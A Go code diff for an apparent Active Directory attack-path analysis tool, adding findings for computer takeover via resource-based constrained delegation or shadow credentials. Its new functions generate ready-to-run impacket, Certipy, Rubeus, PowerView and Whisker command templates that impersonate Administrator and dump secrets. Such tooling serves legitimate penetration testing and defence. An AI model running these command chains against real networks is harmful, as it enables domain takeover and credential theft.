@@ -348,6 +348,28 @@ func (m *Model) dangerousACL(id string, n *graph.Node, add func(*Finding)) {
 		if right == "GenericAll" || right == "WriteDacl" || right == "WriteOwner" || right == "Owns" {
 			sev = Crit
 		}
+		// A write-equivalent right over a computer is really an RBCD / shadow-
+		// credentials takeover, not a group-membership tweak — give that card.
+		if n.Kind == graph.Computer && takeoverRight(right) {
+			host := strings.ToLower(tgt) + "." + dn
+			impact := "SYSTEM / local admin on " + tgt + "."
+			if n.Bool("isdc") {
+				impact = "Local admin on " + tgt + ", a domain controller — that is Domain Admin."
+			}
+			add(&Finding{
+				ID: "acl:" + right + ":" + id, Technique: "rbcd", Severity: Crit,
+				Title: "Computer takeover: " + tgt, Anchor: id, Entry: from,
+				Chain: []string{from, id},
+				Why:   fmt.Sprintf("%s has %s over the computer %s. That is enough to take it over via resource-based constrained delegation or shadow credentials.", p, right, tgt),
+				Steps:  computerSteps(right, tgt),
+				Impact: impact,
+				Commands: Commands{
+					Linux:   computerLinux(right, dn, dc, tgt, host),
+					Windows: computerWindows(right, tgt),
+				},
+			})
+			continue
+		}
 		add(&Finding{
 			ID: "acl:" + right + ":" + id, Technique: "acl", Severity: sev,
 			Title: aclTech[right] + " over " + tgt, Anchor: id, Entry: from,
@@ -360,6 +382,64 @@ func (m *Model) dangerousACL(id string, n *graph.Node, add func(*Finding)) {
 				Windows: aclWindows(right, tgt),
 			},
 		})
+	}
+}
+
+func takeoverRight(right string) bool {
+	switch right {
+	case "GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "Owns", "AllExtendedRights", "AddKeyCredentialLink":
+		return true
+	}
+	return false
+}
+
+// ownershipPrefix returns the extra steps needed when the right is ownership /
+// WriteDacl rather than a direct write.
+func ownershipPrefix(right, tgt string) []string {
+	switch right {
+	case "WriteOwner", "Owns":
+		return []string{"Take ownership of " + tgt + ", then grant yourself write access to it."}
+	case "WriteDacl":
+		return []string{"Add an ACE giving yourself write access to " + tgt + "."}
+	}
+	return nil
+}
+
+func computerSteps(right, tgt string) []string {
+	if right == "AddKeyCredentialLink" {
+		return []string{
+			"Add a key credential to " + tgt + " (shadow credentials).",
+			"Authenticate with the certificate (PKINIT) to recover " + tgt + "'s NT hash.",
+			"Use the hash to act as " + tgt + " (secretsdump / pass-the-hash).",
+		}
+	}
+	steps := ownershipPrefix(right, tgt)
+	return append(steps,
+		"Option A — RBCD: create a machine account (needs MachineAccountQuota > 0), write it into "+tgt+"'s msDS-AllowedToActOnBehalfOfOtherIdentity, then S4U to get a ticket as Administrator to "+tgt+".",
+		"Option B — Shadow credentials: write a key credential to "+tgt+", then PKINIT to recover its NT hash.",
+	)
+}
+
+func computerLinux(right, dn, dc, tgt, host string) []Command {
+	if right == "AddKeyCredentialLink" {
+		return []Command{{"Shadow credentials (Certipy)", fmt.Sprintf("certipy shadow auto -u <user>@%s -p '<password>' -account '%s$' -dc-ip <dc-ip>", dn, tgt)}}
+	}
+	return []Command{
+		{"RBCD 1 — create a machine account", fmt.Sprintf("addcomputer.py -computer-name '<newpc>$' -computer-pass '<newpass>' %s/<user>:'<password>' -dc-ip <dc-ip>", dn)},
+		{"RBCD 2 — set delegation on " + tgt, fmt.Sprintf("rbcd.py -delegate-from '<newpc>$' -delegate-to '%s$' -action write %s/<user>:'<password>' -dc-ip <dc-ip>", tgt, dn)},
+		{"RBCD 3 — ticket as Administrator", fmt.Sprintf("getST.py -spn cifs/%s -impersonate Administrator %s/'<newpc>$':'<newpass>' -dc-ip <dc-ip>", host, dn)},
+		{"RBCD 4 — dump secrets", fmt.Sprintf("KRB5CCNAME=Administrator@cifs_%s@%s.ccache secretsdump.py -k -no-pass %s", strings.ReplaceAll(host, ".", "_"), strings.ToUpper(dn), host)},
+		{"Shadow creds (alternative)", fmt.Sprintf("certipy shadow auto -u <user>@%s -p '<password>' -account '%s$' -dc-ip <dc-ip>", dn, tgt)},
+	}
+}
+
+func computerWindows(right, tgt string) []Command {
+	if right == "AddKeyCredentialLink" {
+		return []Command{{"Shadow credentials (Whisker)", fmt.Sprintf("Whisker.exe add /target:%s$", tgt)}}
+	}
+	return []Command{
+		{"RBCD (Powermad + PowerView + Rubeus)", fmt.Sprintf("New-MachineAccount -MachineAccount <newpc> -Password $(ConvertTo-SecureString '<newpass>' -AsPlainText -Force)\n$sid=(Get-DomainComputer <newpc> -Properties objectsid).objectsid\nSet-DomainRBCD -Identity %s -DelegateFrom $sid\nRubeus.exe hash /password:<newpass> /user:<newpc>$\nRubeus.exe s4u /user:<newpc>$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/%s /ptt", tgt, strings.ToLower(tgt))},
+		{"Shadow credentials (Whisker)", fmt.Sprintf("Whisker.exe add /target:%s$", tgt)},
 	}
 }
 
